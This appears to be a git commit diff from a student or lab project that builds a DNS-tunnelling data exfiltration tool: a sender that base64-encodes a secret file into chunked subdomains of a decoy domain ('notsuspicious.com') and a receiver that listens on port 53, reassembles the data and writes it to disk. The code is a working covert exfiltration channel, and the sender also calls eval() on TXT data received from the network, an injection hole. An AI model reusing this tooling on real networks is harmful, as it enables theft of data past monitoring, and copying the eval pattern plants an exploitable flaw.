486eed4d26f110936a42ed8dd02f7e925ebed2e3
GrafikkartenGerd <115479415+GrafikkartenGerd@users.noreply.github.com>
2024-11-09 19:08:21 +0100

    Js (#4)
    * dns send and receive
    
    * -Added Secret File content
    -Added Sender File Reader
    -Added Sender Encoder (Base64 Encodes the Secret Text)
    -Added Sender Domain Composer (Adds Fake Domain and Encoded Secret Text)
    -Added Sender Domain Splitter (Seperates Domain into sendable sizes)
    
    * package capturing works
    
    * feat: add pcap writer to reciever
    
    - change the docker file for receiver
    - add comments
    - formatting the code
    
    * feat: write received data to file
    
    ---------
    
    Co-authored-by: Justus Siegert <jubesie@googlemail.com>
    Co-authored-by: Timon Kleinknecht <timon.kknecht@gmail.com>
    Co-authored-by: Juqsi <91261422+Juqsi@users.noreply.github.com>

---
+++ receiver/receiver.py
@@ -0,0 +1,123 @@
+import base64
+import hashlib
+import socket
+import dns.message
+import dns.rrset
+import dns.rdtypes
+import dns.rdatatype
+import dns.rdataclass
+import dns.rdtypes.ANY.TXT
+from scapy.all import *
+from scapy.sendrecv import sniff
+from scapy.utils import wrpcap
+
+# Decompose the base64 encoded text
+def dns_decompose(text):
+    print(text)
+
+    # Add padding if needed
+    padding_needed = len(text) % 4
+    if padding_needed:
+        text += '=' * (4 - padding_needed)
+    try:
+        # Decode the base64 encoded text
+        decoded_bytes = base64.b64decode(text)
+        return decoded_bytes.decode('utf-8')
+    except Exception as e:
+        # Handle decoding errors
+        print(f"Error decoding: {e}")
+        return None
+
+# Write the received packets to a pcap file
+def pcap_writer():
+    # Sniff packets on the eth0 interface and write them to a pcap file
+    def sniff_and_write():
+        packets = sniff(iface="eth0", filter="udp and port 53", timeout=8)
+        wrpcap("send_data.pcap", packets)
+        # Write the packet details to a text file
+        with open("packet_details.txt", "w") as file:
+            for packet in packets:
+                file.write(packet.show(dump=True) + "\n")
+    # Start the sniffing and writing thread
+    thread = threading.Thread(target=sniff_and_write)
+    thread.start()
+
+# Hash the input string using SHA-256
+def hash_string(input_string):
+    sha256_hash = hashlib.sha256()
+    sha256_hash.update(input_string.encode('utf-8'))
+    return sha256_hash.hexdigest()
+
+# Start the DNS server on the specified port
+def start_server(port):
+    pcap_writer()
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+        sock.bind(('0.0.0.0', port))
+        print(f"Listening for DNS requests on port {port}...")
+
+        all_content = ""
+        receiving = True
+        while receiving:
+            data, addr = sock.recvfrom(512)
+            print(f"Received DNS request from {addr}")
+            try:
+                # Parse the DNS request
+                request = dns.message.from_wire(data)
+
+                domain = str(request.question[0].name)
+                data = domain.split('.')[0]
+                my_hash = hash_string(domain)
+
+                # Check if the request contains an Additional Section
+                if request.additional:
+                    additional_records = []
+                    for additional in request.additional:
+                        # Check if the Additional Section contains TXT records
+                        if additional.rdtype == dns.rdatatype.TXT:
+                            for txt in additional.items:
+                                # Decode the TXT record and add it to the list
+                                additional_records.append(b''.join(txt.strings).decode())
+
+                    if not additional_records:
+                        print("No hash for validation found in the Additional Section.")
+                    if additional_records[0] == my_hash:
+                        # Extract the data from the request
+                        all_content += dns_decompose(data)
+                        # Write the data to a file
+                        with open("secret_file.txt", "w") as secret_file:
+                            secret_file.write(all_content)
+                        # Check if the domain is the end of transmission
+                        if domain.split('.')[1] == "0":
+                            print("End of transmission")
+                            print(all_content)
+                            all_content = ""
+                            receiving = False
+
+                        message = ["False"]
+                    else:
+                        # The hash in the Additional Section does not match the domain hash
+                        print(f"Received hash from package {domain.split('.')[1]} does not match the domain hash.")
+                        message = ["True"]
+                else:
+                    print("No Additional Section found in the request.")
+                    message = ["True"]
+                # Create a DNS response with the message
+                response = dns.message.make_response(request)
+
+                # Add the TXT record to the response
+                name = request.question[0].name
+                ttl = 300
+                rdata = dns.rdtypes.ANY.TXT.TXT(dns.rdataclass.IN, dns.rdatatype.TXT, message)
+                rrset = dns.rrset.from_rdata(name, ttl, rdata)
+                response.answer.append(rrset)
+
+                # Send the response back to the client
+                sock.sendto(response.to_wire(), addr)
+
+            except Exception as e:
+                print(f"Error processing request: {e}")
+
+
+if __name__ == "__main__":
+    port = 53
+    start_server(port)
--- sender/sender.py
+++ sender/sender.py
@@ -1,40 +1,104 @@
-from itertools import count
-from scapy.all import sniff, wrpcap
-
+from time import sleep
 import dns.message
 import dns.query
-import dns.name
-import base64
+import dns.rdata
+import dns.rdataclass
+import dns.rdatatype
+import dns.rrset
+from scapy.all import *
+from scapy.sendrecv import sniff
+from scapy.utils import wrpcap
 
-def read_data ():
-    file = open("secret_file.txt" , "r")
-    file.read()
-    file.close()
+# Read the secret file
+def read_file(filename):
+    secret_file = open(filename,"r")
+    return str(secret_file.read())
 
-    #Hashing the date do ensure data integrity
+# Compose the base64 encoded text
+def dns_compose(text):
+    return base64.b64encode(text.encode('utf-8')).decode('utf-8')
 
+# Hash the input string using SHA-256
+def hash_string(input_string):
+    sha256_hash = hashlib.sha256()
+    sha256_hash.update(input_string.encode('utf-8'))
+    return sha256_hash.hexdigest()
 
-def send_hidden_message(dns_server, hidden_message):
+# Print the records of the specified type
+def print_records(response, record_type):
+    records = []
+    # Iterate over the answers in the response message and extract the records
+    for answer in response.answer:
+        if answer.rdtype == record_type:
+            for item in answer.items:
+                if record_type == dns.rdatatype.TXT:
+                    records.append(b''.join(item.strings).decode())
+    if records:
+        for record in records:
+            return record
+    else:
+        print(f"No {dns.rdatatype.to_text(record_type)} records found.")
+    return False
 
-    encoded_message = base64.urlsafe_b64encode(hidden_message.encode()).decode()
-
-    query_name = f"{encoded_message}.keinKlau.de"
-    #query_name = f"{hidden_message}.keinKlau.de"
-    query = dns.message.make_query(query_name, dns.rdatatype.A)
-
-    try:
-        response = dns.query.udp(query, dns_server)
-        print("DNS-Anfrage gesendet. Antwort erhalten:")
-        print(response)
-    except Exception as e:
-        print(f"Fehler beim Senden der DNS-Anfrage: {e}")
-
+# Start the sniffing and writing thread for the pcap file
 def pcap_writer():
-    packets = sniff(iface= "eth0" ,filter="dns", count=100)
-    wrpcap("send_data.pcap", packets)
+    def sniff_and_write():
+        packets = sniff(iface="eth0", filter="udp and port 53", timeout=8)
+        wrpcap("send_data.pcap", packets)
+        with open("packet_details.txt", "w") as file:
+            for packet in packets:
+                file.write(packet.show(dump=True) + "\n")
+    thread = threading.Thread(target=sniff_and_write)
+    thread.start()
+
+# Send a minimal DNS request to the specified server
+def send_minimal_dns_request(server_ip, domain :str, port):
+    if not domain.endswith('.'):
+        domain += '.'
+
+    # Create a DNS request message
+    request = dns.message.make_query(domain, dns.rdatatype.TXT)
+
+    additional_data = dns.rdata.from_text(dns.rdataclass.IN, dns.rdatatype.TXT, hash_string(domain))
+
+    # Resource Record Set (RRSet) für Additional Section
+    rrset = dns.rrset.from_rdata(dns.name.from_text(domain), 300, additional_data)
+    request.additional.append(rrset)
+
+    request_bytes = request.to_wire()
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+        sock.sendto(request_bytes, (server_ip, port))
+        try:
+            response_bytes, addr = sock.recvfrom(512)
+            response = dns.message.from_wire(response_bytes)
+            a =  eval(print_records(response, dns.rdatatype.TXT))
+            return a
+        except socket.timeout:
+            print("No response received (Timeout)")
 
 if __name__ == "__main__":
-    read_data()
-    dns_server = "127.0.0.1"
-    hidden_message = "Geheime Nachricht"
-    send_hidden_message(dns_server, hidden_message)
+    receiver_ip = "172.36.0.3"
+    port = 53
+    domain_base = ".notsuspicious.com"
+    print(f"Minimal DNS request sent to {receiver_ip}:{port}")
+    secret_text = read_file("secret_file.txt")
+    size = 30
+    number_of_packages = ((size-1)+len(secret_text))//size
+    pcap_writer()
+    sleep(3)
+    # Send the DNS requests
+    for i in range(0,number_of_packages):
+        resp = True
+        while resp:
+            # Compose the domain name for the request based on the current package
+            if len(secret_text)>=size*(i):
+                current_domain = dns_compose(secret_text[i*size:(i+1)*size])
+            elif len(secret_text)>=size*(i+1):
+                current_domain = dns_compose(secret_text[i*size:-1])
+            else:
+                print("ERROR:Index went past Domain Name length")
+                break
+            current_domain += "."+ str(number_of_packages - i -1)+domain_base
+            print(current_domain)
+            print(f"Sending DNS request {i}")
+            resp = send_minimal_dns_request(receiver_ip, str(current_domain), port)
